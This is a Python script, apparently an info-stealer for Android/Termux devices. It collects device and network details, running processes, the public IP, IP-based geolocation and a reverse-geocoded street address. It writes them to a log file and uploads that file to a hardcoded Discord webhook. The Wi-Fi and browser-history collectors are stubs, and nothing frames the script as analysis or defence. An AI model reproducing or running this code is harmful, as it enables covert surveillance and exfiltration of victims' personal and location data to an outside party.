import subprocess
import requests
import platform
import socket
import os
import netifaces
from datetime import datetime, timedelta

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook with file attachment
def send_to_discord_with_file(file_path, message="Log file attached."):
    files = {'file': open(file_path, 'rb')}
    data = {'content': message}
    response = requests.post(webhook_url, files=files, data=data)
    if response.status_code == 204:
        print("File sent successfully to Discord webhook.")
    else:
        print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
        print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get device information
def get_device_info():
    device_info = {
        'Hostname': socket.gethostname(),
        'Platform': platform.system(),
        'Platform Release': platform.release(),
        'Platform Version': platform.version(),
        'Architecture': platform.machine(),
        'Processor': platform.processor(),
        'Python Version': platform.python_version(),
    }
    return device_info

# Function to get network interfaces and their details
def get_network_interfaces():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        info = {}
        if netifaces.AF_INET in addrs:
            info['IPv4'] = addrs[netifaces.AF_INET]
        if netifaces.AF_INET6 in addrs:
            info['IPv6'] = addrs[netifaces.AF_INET6]
        network_info[iface] = info
    
    return network_info

# Function to get saved WiFi profiles for Termux (placeholder)
def get_saved_wifi_profiles_termux():
    # Placeholder for Termux, as direct access to WiFi profiles is not simple
    return []

# Function to collect all saved WiFi profiles
def get_saved_wifi_profiles():
    if platform.system() == 'Linux' and 'Android' in platform.release():  # Assuming Termux on Android
        return get_saved_wifi_profiles_termux()
    else:
        # Implement logic for other platforms if needed
        return []

# Function to get public IP address
def get_public_ip():
    ip = execute_command('curl -s https://api64.ipify.org')
    return ip

# Function to get location information based on public IP
def get_location_info(public_ip):
    response = requests.get(f'https://ipinfo.io/{public_ip}/json')
    if response.status_code == 200:
        location_info = response.json()
    else:
        location_info = {'error': 'Could not retrieve location information'}
    return location_info

# Function to get physical address from location coordinates
def get_address(location):
    if 'loc' in location:
        lat, lon = location['loc'].split(',')
        response = requests.get(f'https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}')
        if response.status_code == 200:
            address_info = response.json()
            address = address_info.get('display_name', 'Address not found')
        else:
            address = 'Could not retrieve address information'
    else:
        address = 'Location coordinates not available'
    return address

# Function to get storage information
def get_storage_info():
    storage_info = execute_command('df -h')
    return storage_info

# Function to get memory information
def get_memory_info():
    memory_info = execute_command('free -h')
    return memory_info

# Function to get CPU information
def get_cpu_info():
    cpu_info = execute_command('lscpu')
    return cpu_info

# Function to get running processes
def get_running_processes():
    processes = execute_command('ps aux')
    return processes

# Function to get network connections
def get_network_connections():
    connections = execute_command('netstat -tuln')
    return connections

# Function to get browser history for Termux (placeholder)
def get_browser_history_termux():
    # Placeholder for Termux, as direct access to browser history databases is not simple
    # Example of what this could look like
    history = [
        {"title": "Example Title", "url": "http://example.com", "timestamp": "2023-05-01T12:00:00"},
        # Add more entries here
    ]
    return history

# Function to collect browser history
def get_browser_history():
    if platform.system() == 'Linux' and 'Android' in platform.release():  # Assuming Termux on Android
        return get_browser_history_termux()
    else:
        # Implement logic for other platforms if needed
        return []

# Collect all information
device_info = get_device_info()
network_interfaces = get_network_interfaces()
saved_wifi_profiles = get_saved_wifi_profiles()
public_ip = get_public_ip()
location_info = get_location_info(public_ip)
address = get_address(location_info)
storage_info = get_storage_info()
memory_info = get_memory_info()
cpu_info = get_cpu_info()
running_processes = get_running_processes()
network_connections = get_network_connections()
browser_history = get_browser_history()

# Write collected information to log.txt
log_file_path = 'log.txt'
with open(log_file_path, 'w') as f:
    f.write("=== Device Information ===\n")
    for key, value in device_info.items():
        f.write(f"{key.capitalize()}: {value}\n")
    f.write("\n")

    f.write("=== Network Interfaces ===\n")
    for iface, info in network_interfaces.items():
        f.write(f"Interface: {iface}\n")
        if 'IPv4' in info:
            for addr in info['IPv4']:
                f.write(f"IPv4 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr['netmask']}\n")
        if 'IPv6' in info:
            for addr in info['IPv6']:
                f.write(f"IPv6 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
        f.write("\n")

    f.write("=== Saved WiFi Profiles ===\n")
    for profile in saved_wifi_profiles:
        f.write(f"SSID: {profile['SSID']}\n")
        if 'Security Key' in profile:
            f.write(f"Security Key: {profile['Security Key']}\n")
        if 'IP Address' in profile:
            f.write(f"IP Address: {profile['IP Address']}\n")
        f.write("\n")

    f.write("=== Public IP and Location ===\n")
    f.write(f"Public IP Address: {public_ip}\n")
    if 'error' in location_info:
        f.write(f"Location Information: {location_info['error']}\n")
    else:
        for key, value in location_info.items():
            f.write(f"{key.capitalize()}: {value}\n")
    f.write(f"Address: {address}\n")
    f.write("\n")

    f.write("=== Storage Information ===\n")
    f.write(f"{storage_info}\n")

    f.write("=== Memory Information ===\n")
    f.write(f"{memory_info}\n")

    f.write("=== CPU Information ===\n")
    f.write(f"{cpu_info}\n")

    f.write("=== Running Processes ===\n")
    f.write(f"{running_processes}\n")

    f.write("=== Network Connections ===\n")
    f.write(f"{network_connections}\n")

    f.write("=== Browser History (Last 2 Months) ===\n")
    for entry in browser_history:
        f.write(f"Title: {entry['title']}\n")
        f.write(f"URL: {entry['url']}\n")
        f.write(f"Timestamp: {entry['timestamp']}\n\n")

# Send log file to Discord webhook
send_to_discord_with_file(log_file_path)
